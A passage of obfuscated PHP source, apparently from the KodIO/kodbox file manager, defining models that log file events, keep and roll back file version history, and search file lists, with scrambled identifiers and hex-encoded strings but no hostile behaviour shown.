array("\144\x65\163\x63", '', "\151\156\x73\x65\x72\164\x2c\x75\160\144\141\x74\145\54\x73\x65\x6c\145\143\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($c¯‘¨•¡³ª, $Fµ…½‹ĞíÂ, $D¾½×ÊÊµ = '') { goto E§·ÈßÏóÖ; E§·ÈßÏóÖ: $Dµ°ÇèÅ‘½ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->eventSave) { return; } $D‰·å±‹×ï = Model($Dµ°ÇèÅ‘½[1143])->sourceInfo($c¯‘¨•¡³ª); goto F¦Ü÷¨†À’; F¦Ü÷¨†À’: if (!$D‰·å±‹×ï) { return !1; } if ($this->isCacheEvent($D‰·å±‹×ï, $Fµ…½‹ĞíÂ)) { return; } if ($D¾½×ÊÊµ && is_string($D¾½×ÊÊµ)) { $D¾½×ÊÊµ = array($Dµ°ÇèÅ‘½[2169] => $D¾½×ÊÊµ); } goto F³÷ÄÊò’; F³÷ÄÊò’: $D¦šÚ¨ÎŠŠ = array($Dµ°ÇèÅ‘½[408] => $c¯‘¨•¡³ª, $Dµ°ÇèÅ‘½[2341] => $D‰·å±‹×ï[$Dµ°ÇèÅ‘½[487]], $Dµ°ÇèÅ‘½[2342] => $D‰·å±‹×ï[$Dµ°ÇèÅ‘½[28]], $Dµ°ÇèÅ‘½[492] => $D‰·å±‹×ï[$Dµ°ÇèÅ‘½[492]], $Dµ°ÇèÅ‘½[1457] => USER_ID, $Dµ°ÇèÅ‘½[413] => $Fµ…½‹ĞíÂ, $Dµ°ÇèÅ‘½[1459] => $D¾½×ÊÊµ); $this->addSystemLog($Fµ…½‹ĞíÂ, $D¦šÚ¨ÎŠŠ); return $this->add($D¦šÚ¨ÎŠŠ); goto dÑˆ¹Ù² µ; dÑˆ¹Ù² µ: } private function addSystemLog($bÎğˆì‚œ, $D‘šèù¥Í°) { $F£Î»äÛë =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($bÎğˆì‚œ == $F£Î»äÛë[2343]) { $bÎğˆì‚œ = $D‘šèù¥Í°[$F£Î»äÛë[430]][$F£Î»äÛë[2344]]; } else { if (in_array($bÎğˆì‚œ, array($F£Î»äÛë[2115], $F£Î»äÛë[2345]))) { $bÎğˆì‚œ = $D‘šèù¥Í°[$F£Î»äÛë[430]][$F£Î»äÛë[719]]; } } $fÍ’øÎ…Äİ = array_merge($D‘šèù¥Í°, array($F£Î»äÛë[2346] => $D‘šèù¥Í°[$F£Î»äÛë[394]], $F£Î»äÛë[2347] => $D‘šèù¥Í°[$F£Î»äÛë[2347]])); Model($F£Î»äÛë[2078])->addLog($F£Î»äÛë[2348] . $bÎğˆì‚œ, $fÍ’øÎ…Äİ); } private function isCacheEvent($FË—„Íˆø, $AïÍ·ã°›˜) { if ($FË—„Íˆø[$_SERVER[åÌÛ»ô¢‚ö™][396]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($e›Úš¢´—, $B©†èêØØÜ) { $b’ÇßùÎÌ‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d÷‹õáß£Ç = Model($b’ÇßùÎÌ‡[1143])->sourceInfo($e›Úš¢´—); $AÌÌÓÒõÁ¦ = array($b’ÇßùÎÌ‡[2344] => $B©†èêØØÜ, $b’ÇßùÎÌ‡[28] => $d÷‹õáß£Ç[$b’ÇßùÎÌ‡[28]]); return $this->addEvent($e›Úš¢´—, $b’ÇßùÎÌ‡[2343], $AÌÌÓÒõÁ¦); } public function eventFileEdit($d˜†Îˆàõµ) { $b†‰˜Š…× =& $_SERVER[åÌÛ»ô¢‚ö™]; $föµŠÇŸŒš = array($b†‰˜Š…×[2349] => $_SERVER[$b†‰˜Š…×[2350]], $b†‰˜Š…×[1782] => strtolower(ACTION)); return $this->addEvent($d˜†Îˆàõµ, $b†‰˜Š…×[2105], $föµŠÇŸŒš); } public function eventRecycle($F¶´ÊñÏ‰, $b²™¦†ğÄÜ) { return $this->addEvent($F¶´ÊñÏ‰, $_SERVER[åÌÛ»ô¢‚ö™][2345], $b²™¦†ğÄÜ); } public function eventRemove($C†¯†¥®Î ) { $dÇ†ÁÓ¥Í =& $_SERVER[åÌÛ»ô¢‚ö™]; $DŒ®§ÓØó = Model($dÇ†ÁÓ¥Í[1143])->sourceInfo($C†¯†¥®Î ); $A½¡¿¡¢áµ = $DŒ®§ÓØó[$dÇ†ÁÓ¥Í[28]]; return $this->addEvent($DŒ®§ÓØó[$dÇ†ÁÓ¥Í[487]], $dÇ†ÁÓ¥Í[2104], $A½¡¿¡¢áµ); } public function eventShare($aîï÷ğè‚…, $c‰š¿°¬éæ) { return $this->addEvent($aîï÷ğè‚…, $_SERVER[åÌÛ»ô¢‚ö™][2115], $c‰š¿°¬éæ); } public function eventMove($cäËÛÙá·, $fÖŸÊÌŒ, $Bª­£—¿±±) { goto BÜ×²²°ñæ; a£§‰‚èÉ: $CÏ•¯òœ‡Ë = $AÜÀÊ«Ä‰…->sourceInfo($fÖŸÊÌŒ); $fÙ³Ï¬• = $AÜÀÊ«Ä‰…->sourceInfo($Bª­£—¿±±); $E«Ï™¡›š = array($E‚åŒ÷ÚŞ[1030] => $fÖŸÊÌŒ, $E‚åŒ÷ÚŞ[2351] => $CÏ•¯òœ‡Ë[$E‚åŒ÷ÚŞ[28]], $E‚åŒ÷ÚŞ[2352] => $CÏ•¯òœ‡Ë[$E‚åŒ÷ÚŞ[492]], $E‚åŒ÷ÚŞ[1031] => $Bª­£—¿±±, $E‚åŒ÷ÚŞ[2353] => $fÙ³Ï¬•[$E‚åŒ÷ÚŞ[28]], $E‚åŒ÷ÚŞ[2354] => $fÙ³Ï¬•[$E‚åŒ÷ÚŞ[492]]); goto c¸•Ğå‡“Ñ; c¸•Ğå‡“Ñ: $this->addEvent($cäËÛÙá·, $E‚åŒ÷ÚŞ[518], $E«Ï™¡›š); $a–ø†Üãğ = $AÜÀÊ«Ä‰…->sourceInfo($cäËÛÙá·); $E«Ï™¡›š = array($E‚åŒ÷ÚŞ[394] => $a–ø†Üãğ[$E‚åŒ÷ÚŞ[394]], $E‚åŒ÷ÚŞ[28] => $a–ø†Üãğ[$E‚åŒ÷ÚŞ[28]]); goto FÎ‰á§³‡; BÜ×²²°ñæ: $E‚åŒ÷ÚŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÜÀÊ«Ä‰… = Model($E‚åŒ÷ÚŞ[1143]); $a–ø†Üãğ = $AÜÀÊ«Ä‰…->sourceInfo($cäËÛÙá·); goto a£§‰‚èÉ; FÎ‰á§³‡: $this->addEvent($fÖŸÊÌŒ, $E‚åŒ÷ÚŞ[2355], $E«Ï™¡›š); goto dõ´ÉŠôö’; dõ´ÉŠôö’: } public function eventCopy($aäŞÛé±) { $this->eventCreate($aäŞÛé±, $_SERVER[åÌÛ»ô¢‚ö™][516]); } public function eventRename($Cç†¦Ñæˆš, $e“¢ÄØ„™’, $aÙ£–íƒ) { $EÒ’Ï¹á»Ï =& $_SERVER[åÌÛ»ô¢‚ö™]; $c±¹å÷¦Ó½ = array($EÒ’Ï¹á»Ï[1030] => $e“¢ÄØ„™’, $EÒ’Ï¹á»Ï[1031] => $aÙ£–íƒ); return $this->addEvent($Cç†¦Ñæˆš, $EÒ’Ï¹á»Ï[1156], $c±¹å÷¦Ó½); } public function eventAddComment($eÔ‘õÈ¶î, $eì‡¬«¼ÚŠ) { return $this->addEvent($eÔ‘õÈ¶î, $_SERVER[åÌÛ»ô¢‚ö™][2356], $eì‡¬«¼ÚŠ); } public function eventAddDesc($fãšÏ¯«˜, $CÃĞÎÕôõø) { return $this->addEvent($fãšÏ¯«˜, $_SERVER[åÌÛ»ô¢‚ö™][2357], $CÃĞÎÕôõø); } public function listBySource($A÷æ“¶Â³…) { goto Eë·‰ƒªĞ; cÉ§°‡’Ô‘: if ($EİÌ…‹ÃŒë[$aÒŒ„²¥[395]] == $aÒŒ„²¥[83]) { $DÄ°Œ„í¥¿ = Model($aÒŒ„²¥[1143])->listSearchChildren($A÷æ“¶Â³…, 20000); $DÄ°Œ„í¥¿[] = $A÷æ“¶Â³… . $aÒŒ„²¥[377]; $B¼£ŠÖã‡‹ = array($aÒŒ„²¥[394] => array($aÒŒ„²¥[7], $DÄ°Œ„í¥¿)); } $eéê‰­ªæ = $this->where($B¼£ŠÖã‡‹)->order($aÒŒ„²¥[2358])->selectPage(); if ($eéê‰­ªæ[$aÒŒ„²¥[367]][$aÒŒ„²¥[368]] == 0) { $eéê‰­ªæ[$aÒŒ„²¥[367]][$aÒŒ„²¥[368]] = 1; $eéê‰­ªæ[$aÒŒ„²¥[370]] = array(array($aÒŒ„²¥[408] => $A÷æ“¶Â³…, $aÒŒ„²¥[2341] => $EİÌ…‹ÃŒë[$aÒŒ„²¥[487]], $aÒŒ„²¥[1457] => $EİÌ…‹ÃŒë[$aÒŒ„²¥[403]], $aÒŒ„²¥[413] => $aÒŒ„²¥[2359], $aÒŒ„²¥[414] => $EİÌ…‹ÃŒë[$aÒŒ„²¥[200]], $aÒŒ„²¥[1459] => $aÒŒ„²¥[33])); } goto Dî„–éî¥”; Eë·‰ƒªĞ: $aÒŒ„²¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EİÌ…‹ÃŒë = Model($aÒŒ„²¥[1143])->sourceInfo($A÷æ“¶Â³…); $B¼£ŠÖã‡‹ = array($aÒŒ„²¥[408] => $A÷æ“¶Â³…); goto cÉ§°‡’Ô‘; Dî„–éî¥”: return $this->eventListParse($eéê‰­ªæ, $A÷æ“¶Â³…); goto f®²áõ«Ú; f®²áõ«Ú: } private function eventListParse($FÜ…ÁŒãğ, $C‰¯¿¯á„Û) { goto cˆåõÇ¾Ş½; cÜšœâŠ¢Æ: $C‚‚¯Èëì = Model($b±à¦ÄŒİÅ[778])->sourceListInfo($fÀ‘Ñ¡º‰·, !0); foreach ($böÕğˆ„±” as &$fÅ†ó‡‡¹é) { if ($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[29]] == $b±à¦ÄŒİÅ[518] && isset($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[1030]])) { $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[1030]] = $C‚‚¯Èëì[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[1030]]]; $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[1031]] = $C‚‚¯Èëì[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[1031]]]; } if ($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[29]] == $b±à¦ÄŒİÅ[2355] && isset($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[394]])) { $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[394]] = $C‚‚¯Èëì[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]][$b±à¦ÄŒİÅ[394]]]; } $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[416]] = $C‚‚¯Èëì[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[394]]]; $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2360]] = $C‚‚¯Èëì[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2347]]]; if ($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[29]] == $b±à¦ÄŒİÅ[2104]) { $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2360]] = $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[416]]; $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2347]] = $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2360]][$b±à¦ÄŒİÅ[394]]; $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[416]] = !1; $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[394]] = $b±à¦ÄŒİÅ[33]; } $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[2291]] = $FÛâ§ªéÌÚ[$fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[1465]]]; } unset($fÅ†ó‡‡¹é); goto D÷ùãÙšÕ¡; D÷ùãÙšÕ¡: $FÜ…ÁŒãğ[$b±à¦ÄŒİÅ[370]] = $böÕğˆ„±”; return $FÜ…ÁŒãğ; goto E¤Åä´°ç—; Cøîõºó×‘: $fÀ‘Ñ¡º‰· = array_unique($fÀ‘Ñ¡º‰·); $A«Ÿ×¶—«œ = array_unique(array_to_keyvalue($böÕğˆ„±”, $b±à¦ÄŒİÅ[33], $b±à¦ÄŒİÅ[1465])); $FÛâ§ªéÌÚ = Model($b±à¦ÄŒİÅ[503])->userListInfo($A«Ÿ×¶—«œ); goto cÜšœâŠ¢Æ; a¸ŸŠò‘Ë: $céœš££‘’ = array_to_keyvalue($böÕğˆ„±”, $b±à¦ÄŒİÅ[33], $b±à¦ÄŒİÅ[2347]); foreach ($böÕğˆ„±” as $fÅ†ó‡‡¹é) { $e§ğ¦¹“• = $fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[430]]; if ($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[29]] == $b±à¦ÄŒİÅ[518] && isset($e§ğ¦¹“•[$b±à¦ÄŒİÅ[1030]])) { $fÀ‘Ñ¡º‰·[] = $e§ğ¦¹“•[$b±à¦ÄŒİÅ[1030]] . $b±à¦ÄŒİÅ[33]; $fÀ‘Ñ¡º‰·[] = $e§ğ¦¹“•[$b±à¦ÄŒİÅ[1031]] . $b±à¦ÄŒİÅ[33]; } if ($fÅ†ó‡‡¹é[$b±à¦ÄŒİÅ[29]] == $b±à¦ÄŒİÅ[2355] && isset($e§ğ¦¹“•[$b±à¦ÄŒİÅ[394]])) { $fÀ‘Ñ¡º‰·[] = $e§ğ¦¹“•[$b±à¦ÄŒİÅ[394]] . $b±à¦ÄŒİÅ[33]; } } $fÀ‘Ñ¡º‰· = array_merge($fÀ‘Ñ¡º‰·, $céœš££‘’, array($C‰¯¿¯á„Û . $b±à¦ÄŒİÅ[33])); goto Cøîõºó×‘; cˆåõÇ¾Ş½: $b±à¦ÄŒİÅ =& $_SERVER[åÌÛ»ô¢‚ö™]; $böÕğˆ„±” = $FÜ…ÁŒãğ[$b±à¦ÄŒİÅ[370]]; $fÀ‘Ñ¡º‰· = array_to_keyvalue($böÕğˆ„±”, $b±à¦ÄŒİÅ[33], $b±à¦ÄŒİÅ[394]); goto a¸ŸŠò‘Ë; E¤Åä´°ç—: } public function removeBySource($cÕÜğŒ‡„) { $cŞĞ„Û¼´õ = array($_SERVER[åÌÛ»ô¢‚ö™][408] => $cÕÜğŒ‡„); $this->where($cŞĞ„Û¼´õ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\x63\145\x5f\150\151\x73\x74\x6f\x72\171"; public function addHistory($E‹—‰Á¥›Æ, $Fƒ Í¿–Ä÷ = '') { $f÷§²Ù“ÔÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aİ”›¨¾Ô = array($f÷§²Ù“ÔÜ[408] => $E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[394]], $f÷§²Ù“ÔÜ[1457] => isset($E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[404]]) ? $E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[404]] : $E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[403]], $f÷§²Ù“ÔÜ[445] => $E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[444]], $f÷§²Ù“ÔÜ[546] => $E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[77]], $f÷§²Ù“ÔÜ[2361] => $Fƒ Í¿–Ä÷); $E“‡ô•„Ò‚ = $GLOBALS[$f÷§²Ù“ÔÜ[6]][$f÷§²Ù“ÔÜ[84]][$f÷§²Ù“ÔÜ[2362]]; if ($E“‡ô•„Ò‚ > 1) { $this->historyAutoClear($aİ”›¨¾Ô[$f÷§²Ù“ÔÜ[394]]); $this->add($aİ”›¨¾Ô); } Model($f÷§²Ù“ÔÜ[2363])->eventFileEdit($E‹—‰Á¥›Æ[$f÷§²Ù“ÔÜ[394]]); } private function historyAutoClear($B‰£ÙİÖÊ) { goto fÓ†ïíŸ; d‰§¾Ú…ÂŸ: $dĞ¤¢ˆæÔ‰ = $fİØˆ»¸Æ™ == $AÒ¿áô¢¯[2365] ? 3 : $A›‚Ï¡¼­·; if ($A›‚Ï¡¼­· <= 1) { $dĞ¤¢ˆæÔ‰ = 1; } $CÀº×Í•Ó = $dĞ¤¢ˆæÔ‰ - 1; goto DÅº¢¬ É; f”Ç±Î‹ñ„: $AÜÒœ‘šÂÇ = array($AÒ¿áô¢¯[410] => array($AÒ¿áô¢¯[7], $AË´Çˆ÷©)); $this->where($AÜÒœ‘šÂÇ)->delete(); Model($AÒ¿áô¢¯[447])->remove($dÀ…³ÄÏ«ñ); goto B©¡ß£º°; DÀ÷’ÂÎ: if (!$fà–ñİï¶ || $CÀº×Í•Ó >= count($fà–ñİï¶)) { return; } $AË´Çˆ÷© = array_to_keyvalue($fà–ñİï¶, $AÒ¿áô¢¯[33], $AÒ¿áô¢¯[392]); $AË´Çˆ÷© = array_slice($AË´Çˆ÷©, $CÀº×Í•Ó); goto B¶Í¯âç²; B¶Í¯âç²: $dÀ…³ÄÏ«ñ = array_to_keyvalue($fà–ñİï¶, $AÒ¿áô¢¯[33], $AÒ¿áô¢¯[444]); $dÀ…³ÄÏ«ñ = array_slice($dÀ…³ÄÏ«ñ, $CÀº×Í•Ó); if (!$AË´Çˆ÷© || !$dÀ…³ÄÏ«ñ) { return; } goto f”Ç±Î‹ñ„; fÓ†ïíŸ: $AÒ¿áô¢¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fİØˆ»¸Æ™ = Model($AÒ¿áô¢¯[1114])->get($AÒ¿áô¢¯[2364]); $A›‚Ï¡¼­· = $GLOBALS[$AÒ¿áô¢¯[6]][$AÒ¿áô¢¯[84]][$AÒ¿áô¢¯[2362]]; goto d‰§¾Ú…ÂŸ; DÅº¢¬ É: if ($CÀº×Í•Ó >= 500) { return; } $AÜÒœ‘šÂÇ = array($AÒ¿áô¢¯[408] => $B‰£ÙİÖÊ); $fà–ñİï¶ = $this->field($AÒ¿áô¢¯[2366])->where($AÜÒœ‘šÂÇ)->order($AÒ¿áô¢¯[2358])->select(); goto DÀ÷’ÂÎ; B©¡ß£º°: } public function listData($c®†‰—ÑÕø) { goto bÊî™•¸; bÊî™•¸: $EÍ½Ÿ”÷´Â =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dë®í„¬“¤ = array($EÍ½Ÿ”÷´Â[408] => $c®†‰—ÑÕø); $c÷²ßàœæâ = $EÍ½Ÿ”÷´Â[2367]; goto d‚®Ÿ¼âÑÔ; C”ÚÇ±ÔÃ‹: $f„Ï«­¯ù» = 3; if ($aÈ›Ñ‘êß == $EÍ½Ÿ”÷´Â[2365]) { $Fßö¡·£Ò[$EÍ½Ÿ”÷´Â[370]] = array_slice($Fßö¡·£Ò[$EÍ½Ÿ”÷´Â[370]], 0, $f„Ï«­¯ù»); $Fßö¡·£Ò[$EÍ½Ÿ”÷´Â[367]] = array($EÍ½Ÿ”÷´Â[2368] => 1, $EÍ½Ÿ”÷´Â[2369] => 20, $EÍ½Ÿ”÷´Â[2370] => 1, $EÍ½Ÿ”÷´Â[2371] => count($Fßö¡·£Ò[$EÍ½Ÿ”÷´Â[370]])); } return $Fßö¡·£Ò; goto D¥µ¬®Ìåà; d‚®Ÿ¼âÑÔ: $Fßö¡·£Ò = $this->field($c÷²ßàœæâ)->where($Dë®í„¬“¤)->order($EÍ½Ÿ”÷´Â[2358])->selectPage(); $this->_listAppendUser($Fßö¡·£Ò[$EÍ½Ÿ”÷´Â[370]]); $aÈ›Ñ‘êß = Model($EÍ½Ÿ”÷´Â[1114])->get($EÍ½Ÿ”÷´Â[2364]); goto C”ÚÇ±ÔÃ‹; D¥µ¬®Ìåà: } protected function _listAppendUser(&$EäŞŠ…£ğ‘) { $Cô”™¬â†Ä =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÎËğ¨ßŸ‹ = array_to_keyvalue($EäŞŠ…£ğ‘, $Cô”™¬â†Ä[33], $Cô”™¬â†Ä[1465]); $f¢Œ¯­áêÆ = Model($Cô”™¬â†Ä[503])->userListInfo($fÎËğ¨ßŸ‹); foreach ($EäŞŠ…£ğ‘ as &$FÅ„ÒÓÕ›¾) { $dÑáÃÛàªÓ = $FÅ„ÒÓÕ›¾[$Cô”™¬â†Ä[1465]]; $FÅ„ÒÓÕ›¾[$Cô”™¬â†Ä[403]] = $f¢Œ¯­áêÆ[$dÑáÃÛàªÓ] ? $f¢Œ¯­áêÆ[$dÑáÃÛàªÓ] : !1; } unset($FÅ„ÒÓÕ›¾); } public function fileInfo($bŠÂîò«Š) { $CĞíÙñ¶­œ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aíï ì…• = $this->tablePrefix; $e³ÉÀÏÇø± = "{$Aíï ì…•}\x69\157\x5f\x66\151\x6c\145\40\x66\x69\x6c\145\163\40\157\156\x20\146\x69\x6c\x65\163\x2e\x66\x69\154\x65\x49\104\x20\75\x20\x68\x69\x73\164\x6f\162\171\x2e\x66\x69\154\145\111\104"; return $this->alias($CĞíÙñ¶­œ[2372])->where(array($CĞíÙñ¶­œ[410] => $bŠÂîò«Š))->join($e³ÉÀÏÇø±, $CĞíÙñ¶­œ[2373])->find(); } public function removeItem($b¥¾Ñ—¹Öµ) { $dµÈ ®Áñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÇ×»‡Äù = array($dµÈ ®Áñ[410] => $b¥¾Ñ—¹Öµ); $c¶’å¿„ÈÆ = $this->where($AÇ×»‡Äù)->find(); if ($c¶’å¿„ÈÆ) { $bÑ¾À“£ø• = $this->where($AÇ×»‡Äù)->delete(); Model($dµÈ ®Áñ[447])->remove($c¶’å¿„ÈÆ[$dµÈ ®Áñ[444]]); return $bÑ¾À“£ø•; } return !1; } public function removeBySource($B§Šò­Û¦) { goto bò‹ì’¯²; C¬¡Ôå˜·›: $AÅ¦”Ş´Ì· = array($f¡Ìßò‚©§[408] => array($f¡Ìßò‚©§[7], $B§Šò­Û¦)); $EœÁ§Óƒ”¢ = $this->field($f¡Ìßò‚©§[445])->where($AÅ¦”Ş´Ì·)->select(); if ($EœÁ§Óƒ”¢) { $this->where($AÅ¦”Ş´Ì·)->delete(); $dÃ¶Ã¢ã†â = array_to_keyvalue($EœÁ§Óƒ”¢, $f¡Ìßò‚©§[33], $f¡Ìßò‚©§[444]); Model($f¡Ìßò‚©§[447])->remove($dÃ¶Ã¢ã†â); } goto b™Ñá…’Æè; bò‹ì’¯²: $f¡Ìßò‚©§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$B§Šò­Û¦) { return !1; } if (!is_array($B§Šò­Û¦)) { $B§Šò­Û¦ = array($B§Šò­Û¦); } goto C¬¡Ôå˜·›; b™Ñá…’Æè: return !0; goto A–¸Ûøº‡É; A–¸Ûøº‡É: } public function setDetail($C÷×ÀğŞÂ, $F¼ùŠÅµ) { $E›ò²°ô¸ô =& $_SERVER[åÌÛ»ô¢‚ö™]; return $this->where(array($E›ò²°ô¸ô[410] => $C÷×ÀğŞÂ))->save(array($E›ò²°ô¸ô[2361] => $F¼ùŠÅµ)); } public function rollbackToItem($BâÈ§Ä‚Š, $C¯»Ş¿´¬) { goto E™´·™ñá‹; c”ÈÊ¯í‡‡: $C»…ºŸîÇõ = $this->find($C¯»Ş¿´¬); $f­ÜŞÜ‹İ• = array($Cåğë™îâ¯[444] => $C»…ºŸîÇõ[$Cåğë™îâ¯[444]], $Cåğë™îâ¯[77] => $C»…ºŸîÇõ[$Cåğë™îâ¯[77]], $Cåğë™îâ¯[107] => time(), $Cåğë™îâ¯[404] => USER_ID); Model($Cåğë™îâ¯[778])->where(array($Cåğë™îâ¯[394] => $BâÈ§Ä‚Š))->save($f­ÜŞÜ‹İ•); goto dò§í÷ù˜Ì; E™´·™ñá‹: $Cåğë™îâ¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A½ôĞ÷‹²Æ = Model($Cåğë™îâ¯[778])->sourceInfo($BâÈ§Ä‚Š); $this->addHistory($A½ôĞ÷‹²Æ); goto c”ÈÊ¯í‡‡; dò§í÷ù˜Ì: return $this->where(array($Cåğë™îâ¯[410] => $C¯»Ş¿´¬))->delete(); goto c¹Ã¾Š’‰š; c¹Ã¾Š’‰š: } public function clearSame($aÑÇ î¥Ëå) { goto Fœ‘‚Ú‚Ş; Fœ‘‚Ú‚Ş: $DÆÕÇƒÁÌÌ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cñ‡–¦‘Šó = $this->listData($aÑÇ î¥Ëå); $eã¬Íƒ†‰ = array_to_keyvalue_group($cñ‡–¦‘Šó, $DÆÕÇƒÁÌÌ[444]); goto A…³×Ïš¥°; a‘Ì’ºœÒ: if (!$B¬Üç£‘Ñ) { return; } $this->where(array($DÆÕÇƒÁÌÌ[392] => array($DÆÕÇƒÁÌÌ[7], $B¬Üç£‘Ñ)))->delete(); Model($DÆÕÇƒÁÌÌ[447])->remove($fšªÑ¢Œ·†); goto b×¿ƒ”²Â; A…³×Ïš¥°: $fšªÑ¢Œ·† = array(); $B¬Üç£‘Ñ = array(); foreach ($eã¬Íƒ†‰ as $Fç¢´¦²‚À) { if (!$Fç¢´¦²‚À || count($Fç¢´¦²‚À) <= 1) { continue; } foreach ($Fç¢´¦²‚À as $DòìÑ·Òìæ) { $fšªÑ¢Œ·†[] = $DòìÑ·Òìæ[$DÆÕÇƒÁÌÌ[444]]; $B¬Üç£‘Ñ[] = $DòìÑ·Òìæ[$DÆÕÇƒÁÌÌ[392]]; } } goto a‘Ì’ºœÒ; b×¿ƒ”²Â: } public function userSpace() { $B•±¢ÔÜÒæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÆè†‡…áù = $this->tablePrefix; $FÓ£ÓƒË = array($B•±¢ÔÜÒæ[1457] => USER_ID); $f¶¦¢ºÕé = "{$DÆè†‡…áù}\x69\x6f\x5f\146\x69\x6c\x65\x20\146\151\154\x65\x73\x20\157\x6e\40\x66\151\154\145\163\x2e\146\x69\154\145\x49\104\40\x3d\40\x68\x69\x73\x74\157\162\171\x2e\x66\x69\154\145\x49\104"; return $this->alias($B•±¢ÔÜÒæ[2372])->where($FÓ£ÓƒË)->join($f¶¦¢ºÕé, $B•±¢ÔÜÒæ[2373])->sum($B•±¢ÔÜÒæ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($A¤ÀÌ®±‰Ñ) { goto DÜÓ£Ë´‘¯; fæ¢‰Å·Õ±: if (!$C…¿•Ç‘) { return array(); } $b±ÈÜÏè’ = $C…¿•Ç‘[$C‰Ìñ»¾Î¥[165]]; $CˆÂ¤¶ÍÄ = $C‰Ìñ»¾Î¥[7]; goto e±®äó¬; DÜÓ£Ë´‘¯: $C‰Ìñ»¾Î¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dº“È›Ç× = KodIO::fileTypeList(); $C…¿•Ç‘ = $Dº“È›Ç×[$A¤ÀÌ®±‰Ñ]; goto fæ¢‰Å·Õ±; e±®äó¬: if (!$C…¿•Ç‘[$C‰Ìñ»¾Î¥[165]]) { $cø•‘›ò®µ = array_to_keyvalue($Dº“È›Ç×, $C‰Ìñ»¾Î¥[33], $C‰Ìñ»¾Î¥[165]); $b±ÈÜÏè’ = implode($C‰Ìñ»¾Î¥[47], $cø•‘›ò®µ); $CˆÂ¤¶ÍÄ = $C‰Ìñ»¾Î¥[2321]; } $F„ÅçŠçòÚ = explode($C‰Ìñ»¾Î¥[47], trim($b±ÈÜÏè’, $C‰Ìñ»¾Î¥[47])); return array($CˆÂ¤¶ÍÄ, $F„ÅçŠçòÚ); goto bå¹ì£óõ‡; bå¹ì£óõ‡: } public function listPathType($DÄÎ³ôÛ¤ø) { $bˆÙŠ¾ì‰­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aâÀÃ‹Š¬Œ = $this->fileTypeWhere($DÄÎ³ôÛ¤ø); if (!$aâÀÃ‹Š¬Œ) { return array(); } $A» ëÇõ = array($bˆÙŠ¾ì‰­[547] => SourceModel::TYPE_USER, $bˆÙŠ¾ì‰­[548] => USER_ID, $bˆÙŠ¾ì‰­[544] => 0, $bˆÙŠ¾ì‰­[545] => $aâÀÃ‹Š¬Œ); return $this->listSource($A» ëÇõ); } public function listSearch($fÈß®¼’°Ã, $eÈá±îÜİ× = 300) { goto fš¨†™áÍ; AíŸˆë·Øœ: $B­“åÛ²¼ = $this->distinct(!0)->field($B¸Á’‹°¥¶)->where($BàÙ²§ŞÀ£)->selectPage($eÈá±îÜİ×); $this->_listSearchDesc($B­“åÛ²¼, $fÈß®¼’°Ã, $d¶‹´åÛì¸); $this->_listSearchTag($B­“åÛ²¼, $fÈß®¼’°Ã, $d¶‹´åÛì¸); goto DÛ‡‡šòåÈ; F’ÒÂ¢¿ÇÃ: return $B­“åÛ²¼; goto BåŞ·ô‹¢; E÷È¤ƒÈë«: if (!isset($BàÙ²§ŞÀ£[$FÎ¢ª ÀÕã[422]])) { $BàÙ²§ŞÀ£[$FÎ¢ª ÀÕã[422]] = 0; } $B¸Á’‹°¥¶ = $FÎ¢ª 